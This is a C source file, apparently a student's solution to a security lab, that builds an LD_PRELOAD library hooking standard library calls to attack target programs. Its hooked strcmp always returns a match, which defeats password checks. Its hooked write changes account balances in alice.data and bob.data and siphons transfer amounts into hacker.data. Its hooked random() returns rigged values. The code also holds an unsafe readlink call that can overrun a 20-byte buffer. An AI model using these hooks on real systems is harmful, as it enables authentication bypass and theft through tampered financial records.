#include<stdint.h>
#include<stdio.h>
#include<dlfcn.h>
//#include <fcntl.h>
#include<string.h>
#include<errno.h>
#include<execinfo.h>
#include<sys/types.h>
#include<unistd.h>
#include<stdarg.h>
#include<stdlib.h>
/* We aren't providing much code here.  You'll need to implement quite a bit
 * for your library. */

/* Declarations for the functions in part2_hash.cc, so that we don't need an
 * extra header file. */
void malloc_insert(size_t size);
void malloc_dump();
void so_allocate();
void so_deallocate();


static int ignoreMalloc = 0;
int optiontracker=0;
int option=0;
int filedata3=0;
int filedata4=0;
int previousvalue=0;
int alicedescriptor=0;
int bobdescriptor=0;
int existingdif=0;
int randomtrack=0;
int openfile=0;
int lasthacker=1;
int flag=0;
//int randtrack=0;
int lastnonhack=0;
char filename[20];

char* getfilename(int fno){
  
  char proclink[20];
  char* filename=malloc(20*sizeof(char));
  sprintf(proclink, "/proc/self/fd/%d", fno);
  ssize_t r=readlink(proclink, filename, 40);
  // printf("%s\n", filename);
  filename[r]='\0';
 
  //printf("%s\n", filename);
  return filename;
}


int findsubstr(char *needle, char* haystack){
  char buf[strlen(needle)];
  int found=0;
  for(int i=0; i<strlen(haystack);i++){
    memcpy(buf, &haystack[i], strlen(needle));
    if(strncmp(buf, needle, strlen(needle))==0){
      found=1;
      break;
    }
    //printf("%s\n", buf);
  }
  return found;
}

void *malloc(size_t bytes)
{
	static void* (*origMalloc)(size_t) = NULL;
	if(!origMalloc)
	{
		origMalloc = (void* (*)(size_t))dlsym(RTLD_NEXT, "malloc");
	}

	if(ignoreMalloc)
	{
		return origMalloc(bytes);
	}

	ignoreMalloc = 1;
	malloc_insert(bytes);
	ignoreMalloc = 0;

	return origMalloc(bytes);
}

int open(const char *pathname,int flags) //open(1, asdsad)
{
	static int (*originopen) (const char *,int)=NULL;
	if(!originopen)
	{
		originopen=(int (*)(const char *,int))dlsym(RTLD_NEXT,"open");
	}

	  //strncpy(filename, pathname, 20);
	
	

	if(flags==0&&atoi(pathname)<10)
	{
	        
		option=atoi(pathname);
		return originopen(pathname,flags);
	}
	if(option==5){
	  printf("opening file %s\n", pathname);
	  openfile+=1;
	  
	  //randomtrack=0;
	  return originopen(pathname,  flags);
	}


	if(option==2){
	  printf("look out");
	  if(strncmp("alice.data", pathname, 10)==0){
	    alicedescriptor=originopen(pathname,flags);
	    printf("alice descriptor %d\n", alicedescriptor);
	    return alicedescriptor;
	  }

	  if(strncmp("bob.data", pathname, 8)==0){
	    bobdescriptor=originopen(pathname,flags);
	    printf("bob descriptor %d\n", bobdescriptor);
	    return bobdescriptor;
	  }
	  else{
	    printf("reached hereh");
	    return originopen(pathname,flags);
	  }
	  


	}






	else
	{
		return originopen(pathname,flags);
	}
}

int ftruncate(int fd, off_t length){
  static int (*origtruncate) (int, off_t)=NULL;
  if(!origtruncate){
    origtruncate=(int (*) (int, off_t)) dlsym(RTLD_NEXT, "ftruncate");
  }

  if(option==4 || option==5){
    
    //strncpy(filename, pathname, 20);

    
    char valuestr[20];
    memset(valuestr,'\0', 20);
    lseek(fd, 0, SEEK_SET);
    read(fd, valuestr, 20);
    previousvalue=atoi(valuestr);
    printf("file: %d value: %d\n", fd, previousvalue);
    return origtruncate(fd,length);
  }
 
 
 
 
 

 
  else{
    return origtruncate(fd, length);
  }

}

long int random(void){
  
  static long int (*originrandom) (void)=NULL;
  if(!originrandom){
    originrandom=(long int (*) (void)) dlsym (RTLD_NEXT, "random");
  }
  if(option==5){
    randomtrack=randomtrack+1;
    printf("%d\n", randomtrack);
    long int returnval;
    printf("openfile %d\n", openfile);
   
    if(randomtrack-openfile>=3){
      
      randomtrack=randomtrack-1;
      return 0;
    }
    

    if(randomtrack%2!=0){
      return originrandom();
      
    }

    else{
      return 0;
    }
    // optiontracker+=1;
     
    /*if(optiontracker%2!=0){

	printf("%d\n", optiontracker);
	optiontracker+=1;
	return 0;
      }
      else{
	//printf("%d\n", optiontracker);
	//return 0;
	//	optiontracker+=1;
	printf("%d\n", optiontracker);
	optiontracker+=1;
	return originrandom();
	}*/
    
    //if(lastnonhack==0 && (randomtrack!=3)){
      // printf("%d\n", lastnonhack);
    /* if((lastnonhack==0) || (flag==1)){
       lastnonhack=1;
       printf("flag %d\n",flag);
       flag=0;
       lasthacker=0;
       returnval=originrandom();
       printf("%lu %ld\n", returnval);
       return returnval;
       }*/
       
    /* else if(randomtrack==3){
      lastnonhack=0;
      lasthacker=1;
      randomtrack=0;
      random();
      return random();
      
      }*/
    /*else if(lasthacker==0 && (flag==0)){
      printf("%d\n", 0);
      
      lasthacker=1;
      lastnonhack=0;
      return 0;

    }
    else{
      return originrandom();
      }*/
      //optiontracker=0;
  }
  else{
   
    return originrandom();
  }
}

ssize_t write(int fd, const void * buf, size_t count)
{
	static ssize_t (*originwrite)(int,const void *,size_t)=NULL;
	if(!originwrite)
	{
		originwrite=(ssize_t (*)(int,const void *,size_t))dlsym(RTLD_NEXT,"write");
	}
	if(option==2)
	{
	        
		
		
	  
	  char currentfile[30];
	 
	  memset(currentfile, '\0', 30);
	  // printf("%s\n", getfilename(fd));
	  /*if(bob){
	    printf("%s\n", bob);
	  }
	  if(alice){
	    printf("%s\n", alice);
	    }*/
	  strcpy(currentfile, getfilename(fd));
	  
	  //bob=strstr("bob", getfilename(fd));
	  //alice=strstr("alice", getfilename(fd));
	  printf("%s\n", currentfile);
	  int bob=0;
	  bob=findsubstr("bob", currentfile);
	  printf("%d\n", bob);
	  if(bob){
	    int n=atoi(buf);
	    n-=200;
	    char s[10];
	    sprintf(s, "%d\0",n);

	    // memset(findbob,'\0', 30);
	    return originwrite(fd,s,strlen(s));

	  }
	  else{

	    int n=atoi(buf);
	    n+=200;
	    char s[10];
	    sprintf(s, "%d\0",n);
	    //   memset(findalice,'\0', 30);
	    return originwrite(fd,s,strlen(s));

	  }
	  // char* findbob;
	 
	 
	  
	  /* findbob=strstr("bob", currentfile);
	  perror("Error: ");
	  printf("%s\n", findbob);
	  perror("Error: ");
	  char* findalice;
	  // memset(findalice, 'b',5);
	  findalice=strstr("alice", currentfile);*/
	  
	  /* memset(currentfile, 'b', 30);
	       if(findalice)
		{
        		  
			int n=atoi(buf);
			n+=200;
			char s[10];
			sprintf(s, "%d\0",n);
		        memset(findalice,'\0', 30);
			return originwrite(fd,s,strlen(s));
		}
	       if(findbob)
		{
			int n=atoi(buf);
			n-=200;
			char s[10];
			sprintf(s, "%d\0",n);
			
			memset(findbob,'\0', 30);
			return originwrite(fd,s,strlen(s));
		}*/
	       //	else
	  //	{

	  //  return originwrite(fd,buf,strlen(buf));
		  // }
	}
	else if(option==4){
	  printf("Amount being transferred %s\n", buf);
	  int transfer=atoi(buf);
	  

	 
		 
	  //reduce money in existing account 
	 
	  if(previousvalue>=transfer){
	    //ftruncate(fd,0);
	    /* if(previousvalue>transfer){
	      transfer=previousvalue-10;
	      }*/
	    lseek(fd, 0, SEEK_SET);
	    printf("%s\n", filename);
	    printf("amount in dest (before transfer-no decrease) %d\n", previousvalue);
	    
	    printf("amount in transfer %d\n", transfer);
	    existingdif+=(previousvalue-transfer); //keep track of
						   //lost money
	    printf("lost money %d\n", existingdif);
	    printf("Written %s\n", buf);
	    return originwrite(fd, buf, count);

	    
	  }
	  
	  int constant=4;
	  
	 
	   
	  transfer=previousvalue+existingdif;
	   
	  // existingdif-=(transfer-previousvalue);
	 
	  transfer=transfer-constant;
	  char transferbuf[20];
	  sprintf(transferbuf, "%d\n",transfer);
	 
	  lseek(fd, 0, SEEK_SET);
	  printf("amount in dest (before transfer) %d\n", previousvalue);
	  printf("amount in transfer (decreased) %d\n", transfer);
	  printf("amount in transferbuf %s\n", transferbuf);
	  originwrite(fd, transferbuf, sizeof(transferbuf));
	  int hackfd=open("hacker.data", 2);
	 
	  char hackerbuf[20];
	  memset(hackerbuf, '\0', 20);
	  lseek(hackfd, 0, SEEK_SET);
	  read(hackfd, hackerbuf, 20);
	  
	  int hackermoney=atoi(hackerbuf);
	  printf("amountof hackermoney %d\n", hackermoney);
	  hackermoney+=constant;
	  printf("amountof hackermoney %d\n", hackermoney);
	 memset(hackerbuf, '\0', 20);
	  // char newbuf[20];
	  sprintf(hackerbuf, "%d",hackermoney);
	  printf("in hackerbuf %s", hackerbuf);
	 
	  lseek(hackfd, 0, SEEK_SET);
	  existingdif=0;
	  return originwrite(hackfd,hackerbuf,sizeof(hackerbuf));
	 



	  
	}
	/*	else if(option==5){
	  int transfer=atoi(buf);
	  
	  if(previousvalue>=transfer){
	    //ftruncate(fd,0);
	    lseek(fd, 0, SEEK_SET);
	    printf("amount in dest (before transfer-no decrease) %d\n", previousvalue);
	    printf("amount in transfer %d\n", transfer);
	    return originwrite(fd, buf, count);

	    //return 1;
	  }
	  int transferamount=transfer-previousvalue;
	  printf("transfer amount %d\n", transferamount);
	  char prevbuf[20];
	  memset(prevbuf, '\0',20);
	  sprintf(prevbuf, "%d\0", previousvalue);
	  lseek(fd, 0, SEEK_SET);
	  originwrite(fd, prevbuf, 20);
	  char hackerbuf[20];
	  memset(hackerbuf, '\0', 20);
	  int hackerdf=open("hacker.data", 2);
	  lseek(hackerdf,0,SEEK_SET);
	  read(hackerdf, hackerbuf,sizeof(hackerbuf));
	  int hackermoney=atoi(hackerbuf);
	  hackermoney+=transferamount;
	  //  printf("hacker money %d\n", hackermoney);
	   memset(hackerbuf, '\0', 20);
	   sprintf(hackerbuf,"%d\0", hackermoney);
	  //lseek(hackerdf, 0, SEEK_SET);
	  printf("hacker money %s\n", hackerbuf);
	  lseek(hackerdf,0,SEEK_SET);
	  return originwrite(hackerdf, hackerbuf, sizeof(hackerbuf));
	  

	  }*/
	/*else if(option==4)
		{
		  char* arrayoffd[8];
		  arrayoffd[0]=fopeN(
		       if(fd==5)
		{
			char hackerbuf[20];
			filedata4=atoi(buf);
			int gap=6;
			printf("filedata3=%d,filedata4=%d,gap=%d\n",filedata3,filedata4,gap);
			int hackerfd=open("hacker.data",2);
			printf("hackerfd=%d\n",hackerfd);
			lseek(hackerfd, 0, SEEK_SET);
			read(hackerfd, hackerbuf, 20);
			int hackerdata=atoi(hackerbuf);
			if(filedata3>gap/2)

			  {
				filedata3-=gap/2;
				hackerdata+=gap/2;
			}
			else
			{
				hackerdata+=filedata3;
				filedata3=0;
			}
			if(filedata4>gap/2)
			{
				filedata4-=gap/2;
				hackerdata+=gap/2;
			}
			else
			{
				hackerdata+=filedata4;
				filedata4=0;
			}
			char s1[20],s2[20],s3[20];
			sprintf(s1, "%d\0",hackerdata);
			printf("hackerdata=%s",s1);
			ftruncate(hackerfd, 0) ;
			lseek(hackerfd, 0, SEEK_SET);
			originwrite(hackerfd,s1,strlen(s1));
			close(hackerfd);
			sprintf(s2, "%d\0",filedata3);
			printf("filedata3=%s",s2);
			originwrite(4,s2,strlen(s2));
			sprintf(s3, "%d\0",filedata4);
			printf("filedata4=%s",s3);
			return originwrite(5,s3,strlen(s3));
		}
		else if(fd==4)
		{
			filedata3=atoi(buf);//purpose: record balance of account
			return strlen(buf);
		}
		else
		{
			return originwrite(4,buf,strlen(buf));
		}
		}*/
	else
	{
		return originwrite(fd,buf,count);
		}
}

int strcmp(const char* str1, const char* str2)  
{  
    static int (*originstrcmp)(const char*,const char*)=NULL;
    if(!originstrcmp)
   	{
   		originstrcmp=(int (*)(const char *,const char*))dlsym(RTLD_NEXT,"strcmp");
   	}
   	if(option==1)
   		return 0;
   	else
   	{
   		return originstrcmp(str1,str2);
   	}
}  
// int random(int n)
// {
// 	static int (*originrandom)(int)=NULL;
// 	if(!originrandom)
// 	{
// 		originrandom=(int (*)(int))dlsym(RTLD_NEXT,"random");
// 	}
// 	else
// 	{
// 		return originrandom(n);
// 	}
// }
__attribute__((destructor))
  /*static int getfd(char *pathname){
  return open(pathname, 0);

}*/

/*static char* getfilename(FILE* fp){
  int fno=fileno(fp);
  char proclink[20];
  char filename[20];
  sprintf(proclink, "/proc/self/fd/%d", fno);
  ssize_t r=readlink(proclink, filename, 20);
  filename[r]='\0';
  return filename;
  }*/

static void deallocate()
{
	malloc_dump();
	so_deallocate();
}


__attribute__((constructor))
static void allocate()
{
	so_allocate();
}

